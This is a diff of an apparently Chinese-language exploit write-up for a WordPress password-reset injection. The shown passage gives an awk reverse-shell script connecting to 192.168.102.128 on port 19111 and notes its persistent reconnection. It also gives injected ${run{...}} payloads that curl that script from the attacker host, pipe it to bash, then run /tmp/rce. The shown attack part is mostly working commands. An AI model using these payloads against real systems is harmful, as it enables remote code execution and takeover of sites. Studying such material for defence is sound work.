@@ -734,14 +734,16 @@ wp-submit<span class="token operator">=</span>Get+New+Password<span class="token
 <blockquote>
 <p>测试下载反弹shell：<br>注意：</p>
 <ul>
-<li>本地启用http服务</li>
+<li>攻击机启用http服务</li>
 <li>远程 URL 中不能有 <code>http://</code></li>
 <li>所有字母必须小写</li>
 </ul>
 </blockquote>
 <p>远程反弹shell脚本内容(192.168.102.128/reverse_shell)：<br> </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">awk</span> <span class="token string">'BEGIN {s = "/inet/tcp/0/192.168.102.128/19111"; while(42) { do{ printf "shell&gt;" |&amp; s; s |&amp; getline c; if(c){ while ((c |&amp; getline) &gt; 0) print <span class="token variable">$0</span> |&amp; s; close(c); } } while(c != "exit") close(s); }}'</span> /dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p></p>
 <blockquote>
-<p>Awk弹shell 具有长联优势<br>长联：客户端一直保持向服务端反弹shell的状态<br>(即使服务端断开连接不用在受害者主机中再次执行命令直接nc接shell即可)</p>
+<ul>
+<li>Awk弹shell 具有长联优势<br>长联：客户端一直保持向服务端反弹shell的状态<br>(即使服务端断开连接不用在受害者主机中再次执行命令直接nc接shell即可)</li>
+</ul>
 </blockquote>
 <p>payload：<br> <code>aa(any -froot@localhost -be ${run{/usr/bin/curl --output-document /tmp/rce 192.168.102.128/reverse_shell|bash}} null)</code><br>执行反弹shell：<br> <code>aa(any -froot@localhost -be ${run{/bin/bash /tmp/rce}} null)</code> </p>
 <p>两个payload转换过来就是</p>
